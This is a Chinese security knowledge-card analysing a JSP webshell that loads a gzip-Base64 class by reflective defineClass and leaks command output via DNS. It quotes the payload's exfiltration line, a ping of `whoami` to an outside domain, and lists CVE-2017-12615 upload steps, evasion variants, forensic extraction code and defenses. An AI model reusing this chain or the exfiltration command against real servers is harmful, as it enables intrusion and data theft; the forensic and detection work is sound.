---
id: web-java-classloader-gzip-base64-dnslog-jsp-webshell
title: JSP 内置 GZIP+Base64 类 blob：反射 defineClass 内存马 + DNSlog 回显
type: scenario
domain: web
path: web/java/classloader
technique: jsp-gzip-base64-defineclass-dnslog-webshell
aliases:
- 变异 JSP WebShell
- GZIP 类加载马
- defineClass 内存马 DNS 回显
- lgetwr context key
- ThrowableDeserializer 马
- DNSlog 回显 WebShell
tags:
- java
- jsp
- classloader
- webshell
- dnslog
- gzip
- base64
- tomcat
- cve-2017-12615
cve:
- CVE-2017-12615
severity: high
confidence: high
status: draft
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

这类“变异”JSP 马不在磁盘写 `.class`，而是把 `base64(gzip(class))` 直接嵌在 JSP 里：首次请求时 Base64 解码、Gunzip、反射调用 `ClassLoader#defineClass` 定义字节码，实例化后存入静态 `context` Map；之后的请求用硬编码的 context key（文中为 `lgetwr`）取出实例并调用 `equals(new Object[]{request,response})` 执行命令，命令输出不返回 HTTP 响应，而是用 `ping -c 1 \`whoami\`.d5454c8975.ipv6.1433.eu.org.` 走 DNS 外带。

## 原理

- **类 blob 内嵌**：JSP 中 `byte[] data = b64Decode("H4sIA...")`，`H4sIA` 是 gzip 魔数 `1f 8b 08` 的 Base64 前缀；`unc()` 用 `GZIPInputStream` 解压得到完整 class 字节。这样 JSP 文件本身就是投放器，不需要额外的 `.class` 落地。
- **反射 defineClass**：`ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class)` + `setAccessible(true)`，再 `invoke` 到 `new URLClassLoader(new URL[0], TCCL)` 上。`defineClass` 是 protected，普通代码不能直接调用；反射 + setAccessible 绕过访问控制，把字节数组直接定义成类，类名/包名由字节码自身决定。
- **静态 Map 缓存实例**：`static Map<String,Object> context`；首次请求 `context.put("lgetwr", clazz.newInstance())`，后续请求 `context.get("lgetwr").equals(new Object[]{request, response})`。`equals` 被重写成命令执行入口，参数数组把 Servlet 的 request/response 注入 payload；这样避免每次请求重复 defineClass，也把“加载”和“执行”分成两个阶段。
- **DNS 回显**：payload 类内 `Runtime.getRuntime().exec("/bin/bash -c 'ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.'")`，把命令结果编码进 DNS 查询名。相比于 HTTP 回显，DNS 出站通常不被 WAF/出站防火墙拦截，且命令输出不会出现在 Web 访问日志/响应体里；代价是每次只能带少量数据（如 `whoami`），适合验证与慢速外带。
- **密钥/口令内嵌**：payload 类的 `P()` 返回连接口令（文中 `SjIHRC7oSVIE`），`K()` 返回 AES key（文中 `oszXCfTeXHpIkMS3`），`C()` 返回另一个常量（文中 `9d127d5606ee03e479851bf2d4037ba7`，可能是校验/版本标识）。反编译类即可恢复口令与 key，用于解密历史流量。
- **上传入口**：文中该马通过 Tomcat `PUT /hello.jsp/` 上传（CVE-2017-12615 的 PUT + 尾斜杠绕过，`readonly=false` 前提），属于“上传入口 + 内存马 + DNS 外带”的组合链。

## 触发条件

- 目标 Tomcat 允许 PUT 写入 JSP（如 `DefaultServlet` 的 `readonly=false`），或其他可写 JSP 的入口；文中 fscan 识别为 Tomcat 8.5.19 + CVE-2017-12615。
- 目标 JVM 允许 JSP 执行反射 `defineClass`（标准 Tomcat/JDK 均可；强安全管理器/白名单可能拦截）。
- payload 类需要能在目标 JVM 中加载运行；命令执行依赖 `/bin/bash` 与 `ping`，DNS 外带依赖目标能解析外网域名。
- 后续任意请求都会触发 `context.get("lgetwr").equals(...)`；payload 类自身用 `P()` 中的口令做请求认证，需知道该口令才能执行命令（文中 `SjIHRC7oSVIE`），口令与类 blob 都在 JSP/类中可恢复。

## 利用步骤

1. 通过 PUT 或其他上传入口写入 JSP 马；JSP 内容包含 `static Map context`、`b64Decode`、`unc`（GZIP）以及一段 `H4sIA...` 的类 blob。
2. 首次请求 JSP（任意请求），服务端解码/解压/`defineClass` 并把 payload 实例放入静态 Map；此阶段通常没有命令输出。
3. 再次请求同一 JSP（payload 的 `equals` 从 request 取口令/命令），`context.get("lgetwr").equals(new Object[]{request,response})` 触发 payload；若 payload 设计为 DNS 外带，攻击者在自己控制的 DNS 日志中看到 `<命令结果>.<随机子域>.<域名>`。
4. 取证时从 JSP 提取 `H4sIA...` 字符串，Base64 解码后保存为 `.class`（或先 Gunzip 再保存），用 jadx/CFR 反编译，读取 `P()`/`K()`/`C()` 等常量与 `Runtime.exec` 命令。
5. 用 `K()` 返回的 AES key 解密同会话流量（文中为 `oszXCfTeXHpIkMS3`，请求/响应为 Base64 → AES → Gunzip），还原攻击者下发的命令与回显。
6. 结合 DNS 日志、Web 访问日志与文件时间线，还原上传时间、首次触发时间与后续命令。

## PoC

从 JSP 提取并还原类 blob：

```python
import base64, gzip, re, pathlib
jsp = pathlib.Path("hello.jsp").read_text(errors="ignore")
blob = re.search(r'b64Decode\("(H4sIA[A-Za-z0-9+/=]+)"\)', jsp).group(1)
raw = base64.b64decode(blob)
cls = gzip.decompress(raw) if raw[:2] == b"\x1f\x8b" else raw
pathlib.Path("payload.class").write_bytes(cls)   # 再用 jadx 打开
print(cls[:4])                                    # b"\xca\xfe\xba\xbe"
```

说明：PoC 为从文中 JSP 结构整理的提取步骤，未在本地执行该马；`defineClass`/`equals` 的具体 context key、口令与类名以样本为准。

## 变体与关联

- 变体：类 blob 可改成 AES 加密后再 Base64，或拆成多个字符串拼接，规避基于 `H4sIA`/gzip 魔数的静态检测；也可把 blob 放在图片/配置文件中由 JSP 读取。
- 变体：回显方式可换成 DNS TXT、HTTP 请求、ICMP、写入文件后由另一个通道读取；DNS 回显只是其中一种。
- 变体：不缓存实例，每次请求都 `defineClass` 新类（更慢但更难通过类名排查）；或注册 Servlet/Filter/Valve 形成标准内存马（见关联卡）。
- 关联：[[web-java-classloader-jsp-memory-servlet-webshell]]（JSP+ClassLoader 注册内存 Servlet 的同类马）、[[web-java-component-tomcat-cve-2017-12615-put-jsp-upload]]（本场景的上传入口）、[[defense-forensics-godzilla-java-webshell-traffic-decode]]（同类 AES/Base64 流量的解密方法）、[[defense-forensics-suo5-http-tunnel-traffic-identify]]（同文章后续的内存马隧道）。
- 边界：目标禁用 `setAccessible`/反射（强模块化或 SecurityManager）、JSP 无法写入/执行、目标无法出站 DNS、payload 类依赖缺失时，链路不成立。

## 检测与防御

- 文件侧：搜索 JSP 中的 `H4sIA`、`GZIPInputStream`、`defineClass`、`setAccessible(true)`、`static Map` + `context.get(...).equals` 等组合；检查新增 JSP 与 PUT 上传日志。
- 流量侧：JSP 请求体/响应体出现 `cafebabe` 类字节、Base64+GZIP 特征；DNS 日志中出现长随机标签、包含用户名/主机名/命令输出的查询名。
- 主机侧：用 arthas/java-memshell-scanner 枚举无 `CodeSource` 的动态类与静态 Map 中的实例；检查 Tomcat 进程的 `defineClass` 调用与异常类名。
- 加固：修复 PUT 上传（`readonly=true`）、上传目录禁止 JSP 执行、最小权限运行 Tomcat、限制出站 DNS 并部署 DNS 监控、启用 RASP/内存马检测。
- 响应：保存 JSP 与还原的 class 作为证据；删除马文件并重启容器；封禁恶意 DNS 域名；排查同一入口的其他持久化。
